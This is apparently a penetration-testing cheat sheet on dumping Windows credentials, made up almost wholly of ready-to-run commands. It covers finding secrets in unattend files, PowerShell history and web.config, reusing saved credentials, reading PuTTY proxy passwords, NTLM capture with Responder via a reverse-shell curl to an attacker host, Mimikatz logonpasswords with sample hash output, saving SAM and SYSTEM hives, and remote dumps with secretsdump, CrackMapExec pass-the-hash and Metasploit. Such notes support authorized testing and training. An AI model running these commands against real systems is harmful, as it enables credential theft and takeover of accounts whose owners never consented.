# Dumping credentials

## Locally

### Interesting File System

<details>

<summary>Windows configuration file</summary>

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

</details>

<details>

<summary>Powershell History</summary>



Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands.

```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

</details>

<details>

<summary>Saved Windows Credentials</summary>

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```

***

This directory contain all credentials saved by Windows

```
cd C:\Windows\System32\config
```

</details>

<details>

<summary>IIS Configuration</summary>



Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Here is a quick way to find database connection strings on the file:

{% code title="Powershell" %}
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
{% endcode %}

</details>

<details>

<summary>Auto Logon Credentials</summary>

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

</details>



### Retrive from Softwares

<details>

<summary>PuTTY</summary>

PuTTY is a popular SSH client for Windows. It allows users to save sessions with connection details like IP and username, so they don't have to enter them every time. Though PuTTY doesn't save SSH passwords, it does save proxy settings with plain text passwords. To find saved proxy passwords, look for the `ProxyPassword` under this registry key using the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

{% hint style="info" %}
Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
{% endhint %}

</details>



### Retrive from Revshell session

<details>

<summary>NTLM stealing with responder</summary>

Try to steal NTLM of the current session.

{% code title="attacker machine" %}
```bash
responder -I tun0
```
{% endcode %}

{% code title="revshell session" %}
```powershell
curl file://ATT_IP/file.txt
```
{% endcode %}

</details>





### Mimikatz

{% content-ref url="../../../tools/tools/mimikatz.md" %}
[mimikatz.md](../../../tools/tools/mimikatz.md)
{% endcontent-ref %}

Then, we need to transfer the tool to dump hashes to the target machine.

#### mimikatz.exe

```powershell
PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# output
Authentication Id : 0 ; 302247 (00000000:00049ca7)
Session : UndefinedLogonType from 0
User Name : Alice
Domain : DOMAIN
Logon Server : DC1
Logon Time : 12/01/2023 15:13:19
SID : S-1-5-21-3501040295-3816137123-30697657-1109
msv :
[00000003] Primary
* Username : Alice
* Domain : DOMAIN
* NTLM : a0c8746a6efc7782c7c19c55185145be
```

#### Invoke-Mimikatz.ps1

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>



### Stealing SAM & SYSTEM

The easiest way to steal those files is to get a copy from the registry:

```powershell
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali machine and **extract the hashes** using:

```bash
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```



## Remotely

Sections below allow us to dump credentials from Kali linux to Windows target.



### Impacket's secretsdump&#x20;

```bash
impacket-secretsdump $DOMAIN.COM/$USER:$PASS@$DC_IP
```

```bash
impacket-secretsdump administrator:@$IP -hashes $LM:$NT
```



### CrackMapExec



```bash
# print all module
crackmapexec smb -L
```



#### Mimikatz

```bash
crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
```

#### Dump SAM <a href="#dump-sam-hashes" id="dump-sam-hashes"></a>

```bash
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --sam
```

#### Dump LSA <a href="#dump-lsa-secrets" id="dump-lsa-secrets"></a>

```bash
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --lsa
```

#### Dump NTDS <a href="#dump-the-ntdsdit-from-target-dc" id="dump-the-ntdsdit-from-target-dc"></a>

```bash
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --ntds
```

#### Dump LSASS

```bash
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --lsassy

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' -M lsassy
```



### Metasploit

If we have a open meterpreter session&#x20;

```bash
use post/windows/gather/hashdump
set SESSION
run
```





## Hash-Identify

This is a tool that simplify the hash type detection

```bash
hash-identifier
# paste your hash
```



